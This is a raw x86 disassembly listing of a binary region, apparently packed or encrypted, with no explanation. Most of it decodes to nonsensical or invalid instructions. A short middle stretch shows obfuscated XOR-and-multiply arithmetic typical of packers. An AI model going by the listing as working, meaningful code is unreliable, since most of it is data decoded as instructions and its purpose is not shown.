  41ebf3:	jecxz  0x41ec5d
  41ebf5:	xor    DWORD PTR [eax-0x36],0x6c96a43
  41ebfc:	addr16 xchg ebx,edi
  41ebff:	adc    DWORD PTR [ebx+0x1b],0x8d2a824e
  41ec06:	cmp    BYTE PTR [ecx+0x39469d3b],dh
  41ec0c:	mov    WORD PTR [esi-0x18],?
  41ec0f:	cmp    edx,DWORD PTR [esi]
  41ec11:	int    0xc1
  41ec13:	mov    ebx,0x439c086
  41ec18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec19:	mov    esi,0xf63858f2
  41ec1e:	ficom  DWORD PTR ds:0x33d8135b
  41ec24:	and    al,0xea
  41ec26:	or     eax,0x4eae5a25
  41ec2b:	ss and esp,esi
  41ec2e:	jl     0x41ec47
  41ec30:	(bad)  
  41ec31:	mov    ebx,0x9aa7f932
  41ec36:	data16 jecxz 0x41eca3
  41ec39:	icebp  
  41ec3a:	rcl    BYTE PTR [esi],0xac
  41ec3d:	imul   BYTE PTR [esi-0xb8366a1]
  41ec43:	retf   
  41ec44:	aam    0x7c
  41ec46:	cld    
  41ec47:	pop    esp
  41ec48:	xor    DWORD PTR [edx+ebp*1-0x78b2e521],edi
  41ec4f:	enter  0xb912,0x21
  41ec53:	jmp    0x41eccf
  41ec55:	cmc    
  41ec56:	mov    ecx,0x327d0edd
  41ec5b:	sub    eax,0x6cca0d46
  41ec60:	xchg   esp,eax
  41ec61:	scas   al,BYTE PTR es:[edi]
  41ec62:	xchg   esp,eax
  41ec63:	pop    ss
  41ec64:	repz pusha 
  41ec66:	and    BYTE PTR [edx],ch
  41ec68:	neg    DWORD PTR [ecx-0x72e66980]
  41ec6e:	ins    DWORD PTR es:[edi],dx
  41ec6f:	jle    0x41ec24
  41ec71:	js     0x41ec1e
  41ec73:	inc    edi
  41ec74:	push   eax
  41ec75:	sbb    edi,DWORD PTR [ebx-0x6a]
  41ec78:	jmp    0xa147:0xd55168c8
  41ec7f:	call   0xc809:0xa856ed26
  41ec86:	(bad)  
  41ec87:	push   esp
  41ec88:	(bad)  
  41ec89:	in     al,0x53
  41ec8b:	mov    esp,0x6e8591f4
  41ec90:	cmc    
  41ec91:	mov    eax,DWORD PTR [ebp-0x4ef0bdd6]
  41ec97:	or     eax,0xf7456aa7
  41ec9c:	adc    cl,BYTE PTR [edi+0x76]
  41ec9f:	(bad)  
  41eca0:	sub    BYTE PTR [edi+0x1d],ch
  41eca3:	mov    ecx,0x34796b65
  41eca8:	mov    ebx,0x3b58378c
  41ecad:	iret   
  41ecae:	js     0x41ec62
  41ecb0:	sahf   
  41ecb1:	push   0x12f9dc8d
  41ecb6:	sub    dl,BYTE PTR [ecx]
  41ecb8:	fs call 0xa6cd:0xef0bb786
  41ecc0:	sbb    al,0xa1
  41ecc2:	fs push esi
  41ecc4:	or     bh,dl
  41ecc6:	cmp    bh,bl
  41ecc8:	xor    DWORD PTR [eax],ebp
  41ecca:	add    BYTE PTR [edi+0x7a720966],0x38
  41ecd1:	mov    al,ds:0xe344f45e
  41ecd6:	test   eax,0x39b30f25
  41ecdb:	inc    edx
  41ecdc:	iret   
  41ecdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecde:	les    eax,FWORD PTR [ecx+0x16]
  41ece1:	scas   al,BYTE PTR es:[edi]
  41ece2:	mov    al,0x75
  41ece4:	popa   
  41ece5:	pop    ebx
  41ece6:	stos   BYTE PTR es:[edi],al
  41ece7:	call   0x869bc960
  41ecec:	pop    ss
  41eced:	xor    ecx,ebp
  41ecef:	sbb    esi,DWORD PTR [esi-0x31d4a573]
  41ecf5:	xor    ecx,eax
  41ecf7:	mov    DWORD PTR [ebp+0x8],ecx
  41ecfa:	mov    ecx,DWORD PTR [ebp+0x8]
  41ecfd:	mov    edx,DWORD PTR [ebp+0x8]
  41ed00:	imul   edx,edx,0x5708f5
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0xe6e70850
  41edcb:	sub    DWORD PTR ds:0x61da83a0,esi
  41edd1:	bound  eax,QWORD PTR [edi+ebx*2]
  41edd4:	bound  esp,QWORD PTR [edx-0x12]
  41edd7:	cmp    cl,bh
  41edd9:	repz test DWORD PTR [ecx+eiz*8],ebx
  41eddd:	dec    ecx
  41edde:	add    BYTE PTR [ebx],al
  41ede0:	dec    ebx
  41ede1:	cmp    bl,BYTE PTR [ebp-0x58]
  41ede4:	adc    al,0x5a
  41ede6:	fistp  WORD PTR [ebp+0x2a]
  41ede9:	daa    
  41edea:	xchg   edi,eax
  41edeb:	rcl    BYTE PTR [ebp-0x3504dbd5],0xa0
  41edf2:	mov    fs,WORD PTR [edi-0x4e538b4d]
  41edf8:	dec    eax
  41edf9:	jb     0x41ede8
  41edfb:	xchg   edx,eax
  41edfc:	or     BYTE PTR [edx-0xe],ah
  41edff:	inc    ebx
  41ee00:	out    0x12,al
  41ee02:	sar    al,cl
  41ee04:	or     dh,BYTE PTR [eiz*1-0x79f7d677]
  41ee0b:	push   edi
  41ee0c:	xlat   BYTE PTR ds:[ebx]
  41ee0d:	add    DWORD PTR [edi+0x5a],edx
  41ee10:	cmc    
  41ee11:	ds push ecx
  41ee13:	(bad)  
  41ee14:	int3   
  41ee15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee16:	rcr    DWORD PTR [ebx+0x695586cf],0xb9
  41ee1d:	pusha  
  41ee1e:	setno  BYTE PTR [ebx-0x10b54c32]
  41ee25:	push   cs
  41ee26:	arpl   sp,bx
  41ee28:	scas   eax,DWORD PTR es:[edi]
  41ee29:	sbb    bl,BYTE PTR [eax]
  41ee2b:	mov    ds:0x2652505d,al
  41ee30:	pop    esi
  41ee31:	mov    cs,WORD PTR ds:0xf63681e0
  41ee37:	fidiv  DWORD PTR [ebx+0x3f]
  41ee3a:	jp     0x41ee0d
  41ee3c:	xchg   ecx,eax
  41ee3d:	imul   ecx,DWORD PTR [edx],0x60
  41ee40:	jl     0x41ee62
  41ee42:	scas   eax,DWORD PTR es:[edi]
  41ee43:	mov    ds:0xa657db40,al
  41ee48:	mov    ds:0x39b1ecdd,eax
  41ee4d:	ret    
  41ee4e:	int3   
  41ee4f:	mov    esi,0x1de9aeea
  41ee54:	adc    BYTE PTR [esi*2+0x20c1fc2e],ch
  41ee5b:	add    ecx,DWORD PTR [esp+eax*4+0x4c]
  41ee5f:	xchg   ecx,eax
  41ee60:	popa   
  41ee61:	cli    
  41ee62:	mov    DWORD PTR [edx-0x79],0x21b23fc5
  41ee69:	inc    eax
  41ee6a:	mov    bh,0x5f
  41ee6c:	push   ds
  41ee6d:	scas   al,BYTE PTR es:[edi]
  41ee6e:	jle    0x41ee7f
  41ee70:	cmp    eax,0x3c7d8b4b
  41ee75:	loop   0x41ee40
  41ee77:	int    0x47
  41ee79:	mov    ah,0xe4
  41ee7b:	loopne 0x41ee5e
  41ee7d:	jnp    0x41ee46
  41ee7f:	sub    eax,0x8a90d363
  41ee84:	mov    ah,0xaf
  41ee86:	cmc    
  41ee87:	adc    eax,0x59d6baf9
  41ee8c:	jo     0x41eecb
  41ee8e:	xor    ecx,DWORD PTR [edx-0x7c1a4c49]
  41ee94:	push   esi
  41ee95:	push   0xffffff83
  41ee97:	add    esp,ebx
  41ee99:	dec    eax
  41ee9a:	stc    
  41ee9b:	out    0x69,eax
  41ee9d:	push   0xffffffcf
  41ee9f:	push   cs
  41eea0:	sub    BYTE PTR [esi-0x13],bh
  41eea3:	(bad)  
  41eea4:	mov    ah,0xe3
  41eea6:	push   ecx
  41eea7:	mov    ebx,0x7cb592a2
  41eeac:	btr    DWORD PTR [eax+0x62],eax
  41eeb0:	mov    al,0x2b
  41eeb2:	pop    esp
  41eeb3:	push   ss
  41eeb4:	lock stos BYTE PTR es:[edi],al
  41eeb6:	sub    bl,bl
  41eeb8:	fsubr  DWORD PTR [edx]
  41eeba:	inc    ebx
  41eebb:	jne    0x41eeb0
  41eebd:	imul   eax,ecx,0xffffff87
  41eec0:	pop    esp
  41eec1:	ret    
  41eec2:	xchg   DWORD PTR [ebp-0xf],esi
  41eec5:	jl     0x41ef3e
  41eec7:	mov    eax,0x771ed7e3
  41eecc:	jmp    0x532:0x1bce190a
  41eed3:	jns    0x41eea0
  41eed5:	jno    0x41ef0e
  41eed7:	sub    DWORD PTR [edi-0xd2641c9],esi
  41eedd:	push   0x974ce353
  41eee2:	leave  
  41eee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eee4:	pop    ss
  41eee5:	pop    ebx
  41eee6:	sar    BYTE PTR fs:[ebp-0x64],0x67
  41eeeb:	jb     0x41ef5c
  41eeed:	jnp    0x41ef29
  41eeef:	ret    0xfb4b
  41eef2:	xchg   edx,eax
  41eef3:	cs dec edx
  41eef5:	fwait
  41eef6:	leave  
  41eef7:	mov    ah,0xa
  41eef9:	inc    edx
  41eefa:	pop    ds
  41eefb:	test   DWORD PTR [eax-0x5a2829f],ebx
  41ef01:	cdq    
  41ef02:	sbb    al,ch
  41ef04:	dec    ebp
  41ef05:	ffreep st(5)
  41ef07:	pop    ebp
  41ef08:	ret    0x9c96
  41ef0b:	(bad)  
  41ef0c:	pop    ebp
  41ef0d:	push   ss
  41ef0e:	mov    eax,0xacbaf40
  41ef13:	mov    esi,0x5dd3cab3
  41ef18:	popa   
  41ef19:	ja     0x41ef7f
  41ef1b:	inc    esp
  41ef1c:	popa   
  41ef1d:	je     0x41eeb7
  41ef1f:	fld    QWORD PTR [ebp-0xa9d8742]
  41ef25:	adc    eax,0x56818a97
  41ef2a:	add    ebx,DWORD PTR [ebx]
  41ef2c:	cmp    al,0xec
  41ef2e:	sbb    eax,0x297e4c52
  41ef33:	scas   eax,DWORD PTR es:[edi]
  41ef34:	mov    ebx,0xdedfb59f
  41ef39:	dec    edx
  41ef3a:	sbb    eax,0x15786e5
  41ef3f:	push   0x42
  41ef41:	mov    dl,0xff
  41ef43:	mov    ebx,0x22173dba
  41ef48:	sbb    ebp,DWORD PTR [ebx-0x6f]
  41ef4b:	inc    ecx
  41ef4c:	dec    esp
  41ef4d:	xchg   ebx,eax
  41ef4e:	push   es
  41ef4f:	jecxz  0x41ef59
  41ef51:	mov    bl,0xc0
  41ef53:	push   0xa4c189b1
  41ef58:	repnz and ecx,0x7a
  41ef5c:	push   es
  41ef5d:	cmp    ecx,DWORD PTR [edx+ebp*1-0x4374d528]
  41ef64:	add    ebx,DWORD PTR [eax+0x4cf12233]
  41ef6a:	mov    esi,0xa92b0b17
  41ef6f:	enter  0xc2e4,0x27
  41ef73:	ror    BYTE PTR [esi+eax*1-0x67d308e1],cl
  41ef7a:	mov    esp,0xf5cd23b1
  41ef7f:	pop    edi
  41ef80:	cmp    eax,0x1f285bf7
  41ef85:	lds    ebx,FWORD PTR [edi+0x12]
  41ef88:	inc    esp
  41ef89:	xchg   ebp,eax
  41ef8a:	push   edi
  41ef8b:	push   0xffffffd5
  41ef8d:	(bad)  
  41ef8e:	xor    al,0x7e
  41ef90:	(bad)  
  41ef92:	mov    bh,0x5
  41ef94:	in     eax,dx
  41ef95:	jno    0x41f012
  41ef97:	xor    esp,esp
  41ef99:	call   0xe7130345
  41ef9e:	inc    esi
  41ef9f:	push   eax
  41efa0:	add    ebx,DWORD PTR ds:0x85cac714
  41efa6:	mov    ebx,0xffee2c68
  41efab:	(bad)  
  41efac:	fisubr WORD PTR [ebx-0x1ce1b7d1]
  41efb2:	xchg   ebx,eax
  41efb3:	pop    ecx
  41efb4:	and    al,dh
  41efb6:	int    0x63
  41efb8:	les    esp,FWORD PTR [edi-0x8]
  41efbb:	mov    ecx,0xbdfff6bb
  41efc0:	arpl   bx,dx
  41efc2:	ds ins BYTE PTR es:[edi],dx
  41efc4:	jmp    0x1c1a:0x48f0ab69
  41efcb:	xor    bh,bl
  41efcd:	or     eax,0xb93d53d3
  41efd2:	mov    al,ds:0x9a4a4bf1
  41efd8:	dec    esp
  41efd9:	adc    BYTE PTR [edx+eiz*1-0x7525d0a7],cl
  41efe0:	aaa    
  41efe1:	inc    esi
  41efe2:	leave  
  41efe3:	mov    ch,0x5c
  41efe5:	adc    DWORD PTR es:0x1ce0e779,eax
  41efec:	stos   BYTE PTR es:[edi],al
  41efed:	push   edx
  41efee:	or     DWORD PTR [edi+0x38],eax
  41eff1:	retf   
  41eff2:	mov    cl,0xdb
  41eff4:	fwait
  41eff5:	cmp    BYTE PTR [esp+ebp*4+0x68],ch
  41eff9:	cmove  edi,DWORD PTR [ebx-0x1a5bb232]
  41f000:	or     ah,BYTE PTR [edi-0x19]
  41f003:	adc    al,0xbe
  41f005:	repz jmp 0xf537:0x87f2bd6b
  41f00d:	lahf   
  41f00e:	jmp    0x41f048
  41f010:	scas   al,BYTE PTR es:[edi]
  41f011:	xor    DWORD PTR [edx-0x3ee6a797],ebx
  41f017:	adc    BYTE PTR [ecx+0x259276],dl
  41f01d:	sbb    BYTE PTR [esi-0x6aad002f],al
  41f023:	adc    al,0x9a
  41f025:	jp     0x41f079
  41f027:	dec    DWORD PTR [ecx-0xe]
  41f02a:	xor    DWORD PTR [edx+0x2f],0x25720aa1
  41f031:	je     0x41efd6
  41f033:	and    DWORD PTR [edx-0x22f80c4c],ebx
  41f039:	xchg   esp,eax
  41f03a:	xor    DWORD PTR [ebx],edx
  41f03c:	sub    al,0x53
  41f03e:	call   0xa9c2:0x8785b1e6
  41f045:	ficom  DWORD PTR [ecx-0x1e]
  41f048:	pop    ebp
  41f049:	inc    esp
  41f04a:	aas    
  41f04b:	sub    BYTE PTR [esi+0x0],cl
  41f04e:	aas    
  41f04f:	or     BYTE PTR [ebx+0x27],al
  41f052:	jmp    0x8c5e:0x1668661a
  41f059:	loope  0x41f089
  41f05b:	pop    ebx
  41f05c:	jo     0x41f063
  41f05e:	push   ecx
  41f05f:	and    al,BYTE PTR [esi+0x581f6c8b]
  41f065:	test   eax,0x4a2bf570
  41f06a:	mov    ch,BYTE PTR [edx+0xbaee7c5]
  41f070:	daa    
  41f071:	xchg   esp,eax
  41f072:	push   0xbf22c230
  41f077:	lock push ds
  41f079:	add    esi,DWORD PTR [esi+0x470430d8]
  41f07f:	gs sub eax,0x6ed574c1
  41f085:	ins    BYTE PTR es:[edi],dx
  41f086:	fisubr DWORD PTR [eax+0x9]
  41f089:	sbb    ch,BYTE PTR [ebp+0x29d6d4c2]
  41f08f:	aam    0x4f
  41f091:	aaa    
  41f092:	fs xchg esp,eax
  41f094:	faddp  st(2),st
  41f096:	xchg   ebx,eax
  41f097:	scas   eax,DWORD PTR es:[edi]
  41f098:	mov    edx,DWORD PTR [edi-0x22]
  41f09b:	setp   bl
  41f09e:	dec    esi
  41f09f:	hlt    
  41f0a0:	rcl    BYTE PTR [edx],cl
  41f0a2:	cmp    al,0x74
  41f0a4:	out    0x73,al
  41f0a6:	or     BYTE PTR [edx],dh
  41f0a8:	mov    WORD PTR [edi-0x34],?
  41f0ab:	xchg   ebx,eax
  41f0ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ad:	fisttp QWORD PTR [esi-0x561db3d4]
  41f0b3:	mov    edi,0x7126a8ff
  41f0b8:	dec    esp
  41f0b9:	outs   dx,DWORD PTR ds:[esi]
  41f0ba:	mov    ebx,DWORD PTR es:[edx+0x53]
  41f0be:	nop
  41f0bf:	aas    
  41f0c0:	das    
  41f0c1:	addr16 inc esp
  41f0c3:	ins    DWORD PTR es:[edi],dx
  41f0c4:	push   ds
  41f0c5:	imul   ecx,DWORD PTR cs:[esi+0x260f9767],0x71
  41f0cd:	div    DWORD PTR [ebx+0xd594e46]
  41f0d3:	jno    0x41f11c
  41f0d5:	xchg   BYTE PTR [eax+0x5b],dl
  41f0d8:	push   eax
  41f0d9:	inc    ebp
  41f0da:	jecxz  0x41f0a4
  41f0dc:	sbb    eax,eax
  41f0de:	cmp    esi,DWORD PTR [esi]
  41f0e0:	push   es
  41f0e1:	test   BYTE PTR [edi+0x5c],0xc3
  41f0e5:	test   BYTE PTR [edx+0xc],bl
  41f0e8:	ficomp WORD PTR [ebx+0x790d8ef6]
  41f0ee:	mov    esp,0x83b53cee
  41f0f3:	xchg   edi,eax
  41f0f4:	cmp    eax,0xf6856884
  41f0f9:	pop    edi
  41f0fa:	call   FWORD PTR [eax+0x632c40d5]
  41f100:	daa    
  41f101:	icebp  
  41f102:	test   eax,0xa085a8ec
  41f107:	out    0x71,eax
  41f109:	xchg   ecx,eax
  41f10a:	sti    
  41f10b:	(bad)  
  41f10d:	pop    edi
  41f10e:	jb     0x41f0bb
  41f110:	arpl   cx,cx
  41f112:	ss aam 0x63
  41f115:	imul   eax,ecx,0xffffff84
  41f118:	cmp    DWORD PTR [edi-0x68],0x8dd2b0e1
  41f11f:	in     al,dx
  41f120:	and    bh,BYTE PTR [eax-0x2ee23edb]
  41f126:	icebp  
  41f127:	loope  0x41f0aa
  41f129:	dec    esi
  41f12a:	jmp    0x965b4c46
  41f12f:	push   ecx
  41f130:	test   eax,0x93d39439
  41f135:	xor    esi,DWORD PTR [edi-0x453ba1f0]
  41f13b:	mov    bh,BYTE PTR [ecx+0x43]
  41f13e:	mov    al,ds:0xd672fe4e
  41f143:	clc    
  41f144:	ret    
  41f145:	out    dx,al
  41f146:	push   0x40
  41f148:	imul   esi,DWORD PTR [ecx],0x68
  41f14b:	retf   
  41f14c:	lock clc 
  41f14e:	sub    al,0xc
  41f150:	lock xor dl,BYTE PTR [ecx-0x7f]
  41f154:	mov    esp,0xd0f02c05
  41f159:	dec    esp
  41f15a:	loop   0x41f116
  41f15c:	jl     0x41f19f
  41f15e:	xchg   BYTE PTR [edx-0x7c78748f],ah
  41f164:	enter  0xe74c,0x1a
  41f168:	xor    al,0xde
  41f16a:	(bad)  
  41f16c:	iret   
  41f16d:	inc    ebx
  41f16e:	fs in  al,0x65
  41f171:	cdq    
  41f172:	cmp    eax,0x779c6ca8
  41f177:	inc    eax
  41f178:	fbstp  TBYTE PTR [ebp-0x80]
  41f17b:	xor    DWORD PTR [eax-0x28e90c5c],0xa86253fb
  41f185:	outs   dx,DWORD PTR ds:[esi]
  41f186:	mov    dl,0xb9
  41f188:	xchg   esi,eax
  41f189:	int    0x14
  41f18b:	arpl   WORD PTR [edi+0x71220373],bp
  41f191:	jg     0x41f145
  41f193:	je     0x41f186
  41f195:	sub    bh,BYTE PTR [ecx-0x52f1a68b]
  41f19b:	pop    ebx
  41f19c:	inc    ebx
  41f19d:	ins    BYTE PTR es:[edi],dx
  41f19e:	ror    BYTE PTR [ecx+0x6cb683c],0x76
  41f1a5:	sar    BYTE PTR [ebx-0x6cbaef4e],cl
  41f1ab:	and    BYTE PTR [edi],0xaa
  41f1ae:	push   ebx
  41f1af:	rcr    DWORD PTR [edx-0x7a],cl
  41f1b2:	fnstcw WORD PTR [esi]
  41f1b4:	xchg   edx,eax
  41f1b5:	ja     0x41f210
  41f1b7:	and    edi,0xffffff8b
  41f1ba:	aaa    
  41f1bb:	repnz adc esi,DWORD PTR [eax+0x6befef4a]
  41f1c2:	fs mov ebp,0x3e18726a
  41f1c8:	sub    al,0xbe
  41f1ca:	inc    ecx
  41f1cb:	in     al,0x20
  41f1cd:	sbb    DWORD PTR [ecx+0x59585fea],edx
  41f1d3:	dec    esp
  41f1d4:	xchg   BYTE PTR [esi-0x5a02c74a],dl
  41f1da:	cld    
  41f1db:	pop    ebx
  41f1dc:	dec    ebp
  41f1dd:	jg     0x41f232
  41f1df:	inc    esp
  41f1e0:	and    al,0xe4
  41f1e2:	fistp  DWORD PTR [edi-0x65]
  41f1e5:	xchg   ebp,eax
  41f1e6:	scas   al,BYTE PTR es:[edi]
  41f1e7:	out    dx,eax
  41f1e8:	imul   esi,DWORD PTR [eax+0x3a],0x3e46f32f
  41f1ef:	adc    DWORD PTR [ecx+0x55],eax
  41f1f2:	sbb    DWORD PTR [edx+0x7673e6dd],0x63eaae7e
  41f1fc:	cmp    bl,BYTE PTR [ebx-0xf]
  41f1ff:	jle    0x41f1f6
  41f201:	(bad)  
  41f202:	jl     0x41f1dc
  41f204:	adc    DWORD PTR [eax],edx
  41f206:	and    al,0xb2
  41f208:	scas   al,BYTE PTR es:[edi]
  41f209:	inc    eax
  41f20a:	sbb    al,0xd5
  41f20c:	inc    esp
  41f20d:	adc    esp,esp
  41f20f:	push   0xf9eb013d
  41f214:	inc    ecx
  41f215:	xchg   edi,eax
  41f216:	inc    esp
  41f217:	pushf  
  41f218:	push   0x2f
  41f21a:	dec    ecx
  41f21b:	and    al,0xa0
  41f21d:	sub    edx,ebx
  41f21f:	call   0x7cad:0xe7eaa03
  41f226:	data16 outs dx,BYTE PTR ds:[esi]
  41f228:	imul   eax,DWORD PTR [eax+edx*2],0xf8963ae4
  41f22f:	cmp    esi,DWORD PTR [eax]
  41f231:	in     al,dx
  41f232:	inc    ebp
  41f233:	pop    edx
  41f234:	rol    BYTE PTR [edi-0x79],0xa0
  41f238:	inc    edi
  41f239:	ret    
  41f23a:	outs   dx,BYTE PTR ds:[esi]
  41f23b:	mov    ebp,0x1c6d6ce7
  41f240:	xor    cl,BYTE PTR [eax-0x55e2e258]
  41f246:	jmp    0x41f241
  41f248:	cmp    BYTE PTR [ebp+0x4a06a5a7],cl
  41f24e:	xchg   esi,eax
  41f24f:	outs   dx,DWORD PTR ds:[esi]
  41f250:	adc    ecx,ebx
  41f252:	jp     0x41f29e
  41f254:	scas   eax,DWORD PTR es:[edi]
  41f255:	loop   0x41f24a
  41f257:	retf   
  41f258:	cmp    bl,BYTE PTR [eax+ebx*2]
  41f25b:	mov    ecx,0x6b10dee0
  41f260:	add    BYTE PTR [ecx],0x2
  41f263:	cmp    DWORD PTR [ecx],edx
  41f265:	push   eax
  41f266:	sub    eax,0x4df9e53c
  41f26b:	mov    al,0x24
  41f26d:	pop    esi
  41f26e:	jmp    0x41f2b6
  41f270:	data16 (bad) 
  41f272:	sti    
  41f273:	push   esp
  41f274:	retf   
  41f275:	cmc    
  41f276:	shl    BYTE PTR [eax-0x68],1
  41f279:	cmp    esp,DWORD PTR [edi+0x7759b5de]
  41f27f:	mov    ds:0x9dd391b9,al
  41f284:	(bad)  
  41f285:	retf   
  41f286:	lods   eax,DWORD PTR ds:[esi]
  41f287:	sub    al,0x3d
  41f289:	lds    esp,FWORD PTR [ecx+0x16]
  41f28c:	xor    BYTE PTR [ebx],al
  41f28e:	xchg   ebp,eax
  41f28f:	push   ss
  41f290:	push   edx
  41f291:	fwait
  41f292:	sahf   
  41f293:	mov    ds:0x4954f7d1,al
  41f298:	inc    ecx
  41f299:	(bad)  
  41f29a:	stos   BYTE PTR es:[edi],al
  41f29b:	les    ecx,FWORD PTR [esi+0x41532ad5]
  41f2a1:	fcomp  QWORD PTR [esp+ecx*1+0x7f]
  41f2a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2a6:	sbb    ch,BYTE PTR [edi]
  41f2a8:	lea    eax,[ebx]
  41f2aa:	or     edi,esi
  41f2ac:	sub    ebp,edi
  41f2ae:	mov    al,0xfd
  41f2b0:	jmp    0x41f256
  41f2b2:	imul   esi,DWORD PTR [eax],0x55
  41f2b5:	adc    DWORD PTR [ebp+0x6193b9c0],0x5b
  41f2bc:	test   DWORD PTR [ebp+ebp*2+0x8],0x6e700416
  41f2c4:	adc    al,BYTE PTR [eax]
  41f2c6:	add    ebp,DWORD PTR [eax+0x1fcf52dd]
  41f2cc:	add    eax,0x4aebcdd5
  41f2d1:	std    
  41f2d2:	je     0x41f2e8
  41f2d4:	inc    esi
  41f2d5:	into   
  41f2d6:	jp     0x41f2d8
  41f2d8:	mov    ebx,0x6385ace1
  41f2dd:	jmp    0x41f302
  41f2df:	jno    0x41f2f9
  41f2e1:	xor    al,0x1c
  41f2e3:	mov    ds:0x53357409,al
  41f2e8:	or     ch,BYTE PTR [edi]
  41f2ea:	dec    ecx
  41f2eb:	jle    0x41f2e1
  41f2ed:	inc    ebx
  41f2ee:	jecxz  0x41f30d
  41f2f0:	daa    
  41f2f1:	inc    eax
  41f2f2:	gs sbb bh,bh
  41f2f5:	cmp    ah,BYTE PTR [ebp+0x77]
  41f2f8:	sub    BYTE PTR [ecx],dh
  41f2fa:	cmc    
  41f2fb:	add    eax,0x71789b75
  41f300:	and    al,0x40
  41f302:	dec    edx
  41f304:	cmc    
  41f305:	jl     0x41f306
  41f307:	push   cs
  41f308:	xor    eax,0x6f276e72
  41f30d:	lahf   
  41f30e:	mov    al,0x7a
  41f310:	xchg   esp,eax
  41f311:	jo     0x41f2a3
  41f313:	jns    0x41f381
  41f315:	mov    BYTE PTR [ebp-0x66],bh
  41f318:	jbe    0x41f2c4
  41f31a:	in     al,0x17
  41f31c:	(bad)
  41f320:	jo     0x41f33f
  41f322:	jmp    0x41f34f
  41f324:	xchg   edx,eax
  41f325:	stos   DWORD PTR es:[edi],eax
  41f326:	jg     0x41f33c
  41f328:	or     dh,BYTE PTR [ecx+ecx*1]
  41f32b:	das    
  41f32c:	fnstsw WORD PTR [esp+ecx*2-0x34b0de3c]
  41f333:	xor    al,0x13
  41f335:	or     DWORD PTR fs:[edx+0x400a9a0b],esp
  41f33c:	repz adc eax,0x360388ed
  41f342:	nop
  41f343:	and    al,0x81
  41f345:	inc    eax
  41f346:	lods   al,BYTE PTR ds:[esi]
  41f347:	pop    esp
  41f348:	cmc    
  41f349:	inc    ebx
  41f34a:	xor    bl,BYTE PTR [edi]
  41f34c:	xchg   BYTE PTR [edi+0x3b],ah
  41f34f:	push   cs
  41f350:	daa    
  41f351:	cwde   
  41f352:	aas    
  41f353:	ret    
  41f354:	push   eax
  41f355:	aad    0x24
  41f357:	into   
  41f358:	(bad)  
  41f359:	pusha  
  41f35a:	mov    eax,DWORD PTR [ebp+0x7e]
  41f35d:	mov    esi,0x76e789d8
  41f362:	sbb    edx,DWORD PTR [edi]
  41f364:	ins    DWORD PTR es:[edi],dx
  41f365:	pop    sp
  41f367:	add    dl,dh
  41f369:	repnz shl DWORD PTR [bp+si+0x1d],cl
  41f36e:	popf   
  41f36f:	cmp    DWORD PTR [ebp+0x3c],ebx
  41f372:	or     DWORD PTR cs:[edx-0x14],edx
  41f376:	xchg   dl,ch
  41f378:	fstp   QWORD PTR [edx]
  41f37a:	mov    bh,0xdd
  41f37c:	repnz (bad) 
  41f37e:	cmp    BYTE PTR [esi+0x2c],bl
  41f381:	and    ebx,esi
  41f383:	and    ebp,DWORD PTR [ebx]
  41f385:	mov    dh,0xfa
  41f387:	rcl    BYTE PTR [ebx+0x4b5f9f0b],cl
  41f38d:	es mov ecx,0xf0c25eda
  41f393:	jmp    0x41f373
  41f395:	inc    esi
  41f396:	(bad)  
  41f398:	add    ch,BYTE PTR [edi+0x2e]
  41f39b:	mov    dl,0x1b
  41f39d:	or     al,0xf1
  41f39f:	adc    BYTE PTR [ebx],ch
